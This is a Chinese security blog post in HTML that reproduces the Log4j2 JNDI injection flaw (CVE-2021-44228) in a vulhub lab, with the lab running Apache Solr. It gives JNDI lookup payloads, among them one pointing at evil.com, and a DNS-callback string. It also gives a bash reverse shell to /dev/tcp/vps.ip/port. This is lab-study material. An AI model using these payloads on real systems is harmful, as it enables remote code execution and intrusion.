@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="参考文章： https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;316143.html https:&#x2F;&#x2F;www.cnblogs.com&#x2F;0dot7&#x2F;p&#x2F;17259327.html 0x01漏洞描述关于Log4j2Log4j2是一个Java日志组件，被各类Java框架广泛地使用。它的前身是Log4j，Log4j2重新构建和设计了框架，可以认为两者是完全独立的两个日志组件，但是因为存在前身Log">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Log4j2的JNDI注入漏洞复现">
+<meta property="og:url" content="https://wanth3f1ag.top/2025/06/09/Log4j2%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="root@wanth3f1ag">
+<meta property="og:description" content="参考文章： https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;316143.html https:&#x2F;&#x2F;www.cnblogs.com&#x2F;0dot7&#x2F;p&#x2F;17259327.html 0x01漏洞描述关于Log4j2Log4j2是一个Java日志组件，被各类Java框架广泛地使用。它的前身是Log4j，Log4j2重新构建和设计了框架，可以认为两者是完全独立的两个日志组件，但是因为存在前身Log">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250609200609371.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250609201014360.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250609201723324.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250609201756653.png">
+<meta property="article:published_time" content="2025-06-09T11:48:57.000Z">
+<meta property="article:modified_time" content="2025-06-09T12:20:05.663Z">
+<meta property="article:author" content="wanTh3flag">
+<meta property="article:tag" content="JNDI注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250609200609371.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Log4j2的JNDI注入漏洞复现</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">H0me</a></li><!--
+     --><!--
+       --><li><a href="/about/">A6out</a></li><!--
+     --><!--
+       --><li><a href="/tags/">T6gs</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Catagory</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">s4arch</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/06/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96URLDNS%E5%88%A9%E7%94%A8%E9%93%BE/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/06/09/OpenHarmonyCTF2025/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/06/09/Log4j2%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/06/09/Log4j2%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&text=Log4j2的JNDI注入漏洞复现"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/06/09/Log4j2%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=Log4j2的JNDI注入漏洞复现"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/06/09/Log4j2%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&is_video=false&description=Log4j2的JNDI注入漏洞复现"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Log4j2的JNDI注入漏洞复现&body=Check out this article: https://wanth3f1ag.top/2025/06/09/Log4j2%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/06/09/Log4j2%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=Log4j2的JNDI注入漏洞复现"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/06/09/Log4j2%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=Log4j2的JNDI注入漏洞复现"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/06/09/Log4j2%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=Log4j2的JNDI注入漏洞复现"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/06/09/Log4j2%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=Log4j2的JNDI注入漏洞复现"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/06/09/Log4j2%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&name=Log4j2的JNDI注入漏洞复现&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/06/09/Log4j2%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&t=Log4j2的JNDI注入漏洞复现"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">0x01漏洞描述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8ELog4j2"><span class="toc-number">1.1.</span> <span class="toc-text">关于Log4j2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Log4j2-Lookup"><span class="toc-number">1.2.</span> <span class="toc-text">Log4j2 Lookup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞成因</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.</span> <span class="toc-text">0x02环境搭建&amp;漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">3.</span> <span class="toc-text">0x03影响版本</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Log4j2的JNDI注入漏洞复现
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">wanTh3flag</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-06-09T11:48:57.000Z" class="dt-published" itemprop="datePublished">2025-06-09</time>
+        
+        (Updated: <time datetime="2025-06-09T12:20:05.663Z" class="dt-updated" itemprop="dateModified">2025-06-09</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/JNDI%E6%B3%A8%E5%85%A5/">JNDI注入</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/JNDI%E6%B3%A8%E5%85%A5/" rel="tag">JNDI注入</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/316143.html">https://www.freebuf.com/vuls/316143.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/0dot7/p/17259327.html">https://www.cnblogs.com/0dot7/p/17259327.html</a></p>
+<h2 id="0x01漏洞描述"><a href="#0x01漏洞描述" class="headerlink" title="0x01漏洞描述"></a>0x01漏洞描述</h2><h3 id="关于Log4j2"><a href="#关于Log4j2" class="headerlink" title="关于Log4j2"></a>关于Log4j2</h3><p>Log4j2是一个Java日志组件，被各类Java框架广泛地使用。它的前身是Log4j，Log4j2重新构建和设计了框架，可以认为两者是完全独立的两个日志组件，但是因为存在前身Log4j，而且都是Apache下的项目，不管是jar包名称还是package名称，看起来都很相似</p>
+<h3 id="Log4j2-Lookup"><a href="#Log4j2-Lookup" class="headerlink" title="Log4j2 Lookup"></a>Log4j2 Lookup</h3><p>Log4j2的Lookup允许在日志配置和日志消息中动态插入变量值，这些变量可以是外部环境变量，也可以是MDC中的变量，还可以是日志上下文数据等。</p>
+<p>格式类似”${type:var}”，即可以实现对变量var的引用。type可以是如下值：</p>
+<ol>
+<li>ctx：允许程序将数据存储在 Log4j <code>ThreadContext</code>Map 中，然后在日志输出过程中，查找其中的值。</li>
+<li>env：允许系统在全局文件（如 &#x2F;etc&#x2F;profile）或应用程序的启动脚本中配置环境变量，然后在日志输出过程中，查找这些变量。例如：<code>$&#123;env:USER&#125;</code>。</li>
+<li>java：允许查找Java环境配置信息。例如：<code>$&#123;java:version&#125;</code>。</li>
+<li>jndi：允许通过 JNDI 检索变量。</li>
+<li>…</li>
+</ol>
+<p>这次漏洞就跟jndi有关，我们接下来了解一下jndi注入的漏洞成因</p>
+<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>JNDI（Java Naming and Directory Interface，Java命名和目录接口），是Java提供的一个目录服务应用程序接口（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象 。</p>
+<p>JNDI还支持从指定的远程服务器上下载class文件，加载到本地JVM中，并通过适当的方式创建对象。这里就是漏洞的主要来源</p>
+<p>由于Log4j 的 JNDI 支持并没有限制可以解析的名称。一些协议像rmi:和ldap:是不安全的或者可以允许远程代码执行。攻击者在可以控制日志内容的情况下，通过传入类似于<code>$&#123;jndi:ldap://evil.com/example&#125;</code>的lookup用于进行JNDI注入，执行任意代码。</p>
+<p><strong><code>rmi:</code> 协议</strong></p>
+<ul>
+<li><strong>RMI（Remote Method Invocation）</strong> 是 Java 提供的远程方法调用机制，允许一个 Java 虚拟机（JVM）调用另一个 JVM 上的对象方法。</li>
+<li>在 Log4j2 漏洞中，攻击者可以通过 <code>rmi:</code> 协议指向一个恶意的 RMI 服务器，从而触发远程代码执行。</li>
+</ul>
+<p><strong><code>ldap:</code> 协议</strong></p>
+<ul>
+<li><strong>LDAP（Lightweight Directory Access Protocol）</strong> 是一种用于访问目录服务的协议，常用于企业中的身份验证和资源管理。</li>
+<li>在 Log4j2 漏洞中，攻击者可以通过 <code>ldap:</code> 协议指向一个恶意的 LDAP 服务器，返回一个恶意类或序列化对象，从而触发远程代码执行。</li>
+</ul>
+<p>我们举个例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://127.0.0.1/shell&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当我们传入这个字符串的时候，log4j2组件就会将信息记录到日志中，并且log4j2会尝试解析这些信息，通过jndi的lookup()方法去解析该URL：ldap:&#x2F;&#x2F;127.0.0.1&#x2F;shell，由于是ldap协议，所以就会去该地址下的ldap服务中寻找名为shell的资源，找到后将资源信息返回给组件，之后log4j2组件就会下载下来，假如我们的shell文件的一个恶意的.class文件，那就会执行里面的代码，从而造成注入</p>
+<h2 id="0x02环境搭建-漏洞复现"><a href="#0x02环境搭建-漏洞复现" class="headerlink" title="0x02环境搭建&amp;漏洞复现"></a>0x02环境搭建&amp;漏洞复现</h2><p>vulhub靶场有现成的环境</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub/log4j/CVE-2021-44228/</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>使用vulhub靶场，启动一个Apache Solr 8.11.0，其依赖了Log4j 2.14.1</p>
+<p>起环境后访问8983端口</p>
+<p><img src="/../image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250609200609371.png" alt="image-20250609200609371"></p>
+<p>然后我们对网站进行测试，用一个dns服务器起一个域名，这里我用yakit的dns服务器</p>
+<p><img src="/../image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250609201014360.png" alt="image-20250609201014360"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://wsythhvyqt.dgrh3.cn&#125;</span><br></pre></td></tr></table></figure>
+
+<p>利用JNDI发送DNS请求的Payload，并且在dns服务器上成功收到回显</p>
+<p>然后就是漏洞利用了</p>
+<p>使用JNDI注入工具</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">工具地址：https://github.com/welk1n/JNDI-Injection-Exploit</span><br></pre></td></tr></table></figure>
+
+<p>然后我们构造反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/vps.ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>然后用工具进行注入</p>
+<p><img src="/../image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250609201723324.png" alt="image-20250609201723324"></p>
+<p>我这里版本是jdk1.8的，所以直接传就行，然后监听端口就可以收到了</p>
+<p><img src="/../image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250609201756653.png" alt="image-20250609201756653"></p>
+<p>到此靶场的复现就完成了</p>
+<h2 id="0x03影响版本"><a href="#0x03影响版本" class="headerlink" title="0x03影响版本"></a>0x03影响版本</h2><p>Apache Log4j2 2.0.0 - 2.15.0-rc1版本</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">H0me</a></li>
+        
+          <li><a href="/about/">A6out</a></li>
+        
+          <li><a href="/tags/">T6gs</a></li>
+        
+          <li><a href="/categories/">Catagory</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">s4arch</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">0x01漏洞描述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8ELog4j2"><span class="toc-number">1.1.</span> <span class="toc-text">关于Log4j2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Log4j2-Lookup"><span class="toc-number">1.2.</span> <span class="toc-text">Log4j2 Lookup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞成因</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.</span> <span class="toc-text">0x02环境搭建&amp;漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">3.</span> <span class="toc-text">0x03影响版本</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/06/09/Log4j2%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/06/09/Log4j2%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&text=Log4j2的JNDI注入漏洞复现"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/06/09/Log4j2%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=Log4j2的JNDI注入漏洞复现"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/06/09/Log4j2%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&is_video=false&description=Log4j2的JNDI注入漏洞复现"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Log4j2的JNDI注入漏洞复现&body=Check out this article: https://wanth3f1ag.top/2025/06/09/Log4j2%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/06/09/Log4j2%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=Log4j2的JNDI注入漏洞复现"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/06/09/Log4j2%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=Log4j2的JNDI注入漏洞复现"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/06/09/Log4j2%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=Log4j2的JNDI注入漏洞复现"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/06/09/Log4j2%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=Log4j2的JNDI注入漏洞复现"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/06/09/Log4j2%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&name=Log4j2的JNDI注入漏洞复现&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/06/09/Log4j2%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&t=Log4j2的JNDI注入漏洞复现"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        
+<footer id="footer">
+    <div class="footer-left">
+        Copyright ©
+        
+        
+        2024-2025
+        wanTh3flag
+        <br>
+    </div>
+    
+    <div class="footer-right">
+        <nav>
+            <ul>
+                <!--
+                --><li><a href="/">H0me</a></li><!--
+                --><!--
+                --><li><a href="/about/">A6out</a></li><!--
+                --><!--
+                --><li><a href="/tags/">T6gs</a></li><!--
+                --><!--
+                --><li><a href="/categories/">Catagory</a></li><!--
+                --><!--
+                --><li><a href="/links/">L1nks</a></li><!--
+                --><!--
+                --><li><a href="/search/">s4arch</a></li><!--
+                -->
+            </ul>
+            <ul>
+                
+                <!-- 不蒜子统计 -->
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+                <span class="post-meta-divider">|</span>
+                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+        </nav>
+    </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
